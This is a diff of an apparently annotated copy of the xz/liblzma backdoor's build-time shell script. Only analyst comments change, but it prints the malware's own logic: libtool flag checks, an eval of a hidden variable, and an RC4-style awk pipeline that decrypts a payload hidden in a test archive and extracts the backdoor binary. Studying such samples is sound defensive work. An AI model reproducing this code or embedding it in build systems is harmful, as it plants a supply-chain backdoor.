@@ -1,4 +1,4 @@
-# Define a bunch of stuff
+# Define a bunch of stuff (this is just to obfuscate checks/patches)
 P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
 C="pic_flag=\" $P\""
 O="^pic_flag=\" -fPIC -DPIC\"$"
@@ -297,7 +297,7 @@ elif (test -f .libs/liblzma_la-crc64_fast.o) && (test -f .libs/liblzma_la-crc32_
 		exit 0
 	fi
 
-	# Check for PIC flags in libtool
+	# Check for PIC flags in libtool (script)
 	if ! grep -qs "$C" ../../libtool; then
 		exit 0
 	fi
@@ -322,6 +322,7 @@ elif (test -f .libs/liblzma_la-crc64_fast.o) && (test -f .libs/liblzma_la-crc32_
 	# Debug thing
 	eval $zrKcjv
 
+	# No idea why this is needed yet
 	if test -z "$Y"; then
 		N=0
 		W=88664
@@ -330,7 +331,7 @@ elif (test -f .libs/liblzma_la-crc64_fast.o) && (test -f .libs/liblzma_la-crc32_
 		W=0
 	fi
 
-	# Carve-out from archive, decrypt (using RC4) and write the backdoor binary to crc64-fast.so file
+	# Carve-out from archive, decrypt (using a RC4 derivative) and write the backdoor binary to crc64-fast.so file
 	xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" | \
 		LC_ALL=C awk 'BEGIN{FS="\n";RS="\n";ORS="";m=256;for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l<8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t["x" (NF<1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf "%c",(v+k)%m}' | \
 		xz -dc --single-stream | ( (head -c +$N > /dev/null 2>&1) && head -c +$W ) \
